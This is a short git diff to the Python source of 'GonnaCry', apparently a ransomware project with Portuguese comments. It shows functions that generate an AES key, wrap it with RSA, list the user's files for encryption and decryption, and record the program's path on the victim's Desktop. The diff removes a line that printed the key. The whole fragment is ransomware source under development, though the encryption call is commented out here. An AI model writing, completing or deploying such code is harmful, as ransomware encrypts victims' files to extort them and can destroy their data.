@@ -29,6 +29,10 @@ def menu(senha_AES,modo):
     f=open('tipos_arquivos.txt','r')
     tipos=f.read()
     tipos=tipos.split('\n')
+
+    f=open(os.environ['HOME']+'/Desktop/caminho_gc.txt','r')
+    a=f.read()
+    
     listar(senha_AES,home,tipos,modo)
     listar_media(senha_AES,modo,tipos)
 
@@ -101,9 +105,14 @@ def gera_chave_AES():
 
 
 def crypto_all():
+
+    # salva o caminho do GonnaCry
+    a=os.getcwd()
+    f=open(os.environ['HOME']+'/Desktop/caminho_gc.txt','w')
+    f.write(a)
+
     ## IGNORAR ARQUIVOS DO RANSOM
     AES_key=gera_chave_AES()
-    print(AES_key)
     print('[*] chave AES gerada')
     #menu(AES_key,1) # -> criptografa tudo
     AES_to_RSA()
@@ -122,6 +131,7 @@ def decrypt_all():
     a=f.read()
     tam=len(a)
     if(tam==30):
+        adsas=1
         #menu(a,2)
 
 crypto_all()
